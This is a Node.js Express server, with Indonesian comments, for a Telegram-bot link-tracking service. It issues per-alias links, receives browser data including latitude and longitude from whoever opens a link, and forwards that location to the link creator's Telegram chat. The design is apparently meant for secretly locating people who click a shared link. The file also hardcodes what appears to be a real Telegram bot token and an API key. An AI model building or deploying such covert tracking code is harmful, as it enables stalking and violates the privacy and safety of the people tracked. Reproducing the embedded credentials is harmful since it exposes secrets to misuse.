// server.js (Versi Tanpa .env)

// 1. IMPORT SEMUA PACKAGE YANG DIBUTUHKAN
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');

// 2. INISIALISASI APLIKASI DAN KONFIGURASI
const app = express();
const PORT = process.env.PORT || 3000;

// Ambil variabel dari environment Render, atau gunakan nilai hardcode jika tidak ada (untuk lokal)
// PERINGATAN: JANGAN UPLOAD KE GITHUB PUBLIK
const API_KEY = process.env.API_KEY || "KucingTerbangWarnaWarni123!";
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc"; // Ganti dengan Token Anda

// Database sementara di memori
const tracking_data = {};

// 3. MIDDLEWARE
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const apiKeyAuth = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey && apiKey === API_KEY) {
        next();
    } else {
        res.status(403).json({ status: "error", message: "Unauthorized: Invalid API Key" });
    }
};

// ... sisa kode server.js Anda tetap sama persis ...
// (Salin semua fungsi dan route dari versi sebelumnya ke sini)
// ...
// --- Fungsi Baru untuk Kirim Notifikasi ---
async function sendTelegramNotification(chatId, alias, data) {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    
    try {
        const messageText = `🔔 *Update Baru untuk ${alias}!*\n\nDiterima: ${new Date(data.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
        await axios.post(`${telegramApiUrl}/sendMessage`, {
            chat_id: chatId,
            text: messageText,
            parse_mode: 'Markdown'
        });

        if (data.location) {
            await axios.post(`${telegramApiUrl}/sendLocation`, {
                chat_id: chatId,
                latitude: data.location.lat,
                longitude: data.location.lon
            });
        }
        console.log(`[SUCCESS] Notifikasi untuk ${alias} ke chat ID ${chatId} berhasil dikirim.`);
    } catch (error) {
        console.error(`[ERROR] Gagal mengirim notifikasi Telegram:`, error.response ? error.response.data : error.message);
    }
}

// ... dan semua endpoint lainnya ...

// Endpoint untuk frontend (menerima data dari browser)
app.post('/api/data', (req, res) => {
    const { link_id, data } = req.body;
    if (!link_id || !data) return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
    
    let found = false;
    for (const userId in tracking_data) {
        for (const alias in tracking_data[userId]) {
            if (tracking_data[userId][alias].link_id === link_id) {
                const current_data = { ...data, timestamp: new Date().toISOString() };
                tracking_data[userId][alias].last_data = current_data;
                found = true;
                console.log(`[SUCCESS] Data untuk alias '${alias}' berhasil disimpan.`);
                
                sendTelegramNotification(userId, alias, current_data);
                break;
            }
        }
        if (found) break;
    }

    if (found) {
        res.json({ status: "sukses" });
    } else {
        res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
    }
});

// Endpoint untuk Bot Telegram (semua diproteksi oleh apiKeyAuth)
app.post('/api/create_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (!user_id || !alias) {
        return res.status(400).json({ status: "error", message: "user_id dan alias diperlukan" });
    }

    const link_id = uuidv4();
    const link_url = `${req.protocol}://${req.get('host')}/?id=${link_id}`;

    if (!tracking_data[user_id]) {
        tracking_data[user_id] = {};
    }
    
    tracking_data[user_id][alias] = {
        link_id: link_id,
        last_data: null,
        link: link_url,
        created_at: new Date().toISOString()
    };
    
    console.log(`[INFO] Link dibuat untuk user ${user_id} dengan alias ${alias}`);
    res.json({ status: "sukses", link: link_url });
});

app.get('/api/list_links/:user_id', apiKeyAuth, (req, res) => {
    const { user_id } = req.params;
    const userLinks = tracking_data[user_id];
    if (!userLinks) {
        return res.json({ status: "sukses", links: [] });
    }
    const linksToReturn = Object.keys(userLinks).map(alias => ({
        alias: alias,
        link: userLinks[alias].link,
        has_data: !!userLinks[alias].last_data
    }));
    res.json({ status: "sukses", links: linksToReturn });
});

app.get('/api/get_data/:user_id/:alias', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.params;
    const trackingInfo = tracking_data[user_id]?.[alias];

    if (trackingInfo && trackingInfo.last_data) {
        res.json({ status: "sukses", data: trackingInfo.last_data });
    } else {
        res.status(404).json({ status: "error", message: "Data belum tersedia atau alias tidak ditemukan." });
    }
});

app.post('/api/delete_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (tracking_data[user_id]?.[alias]) {
        delete tracking_data[user_id][alias];
        console.log(`[INFO] Link untuk alias ${alias} dari user ${user_id} telah dihapus.`);
        res.json({ status: "sukses", message: `Link untuk ${alias} berhasil dihapus.` });
    } else {
        res.status(404).json({ status: "error", message: "Alias tidak ditemukan" });
    }
});


// 6. JALANKAN SERVER
app.listen(PORT, () => {
    console.log(`Server pelacakan (versi lengkap) berjalan di port ${PORT}`);
});
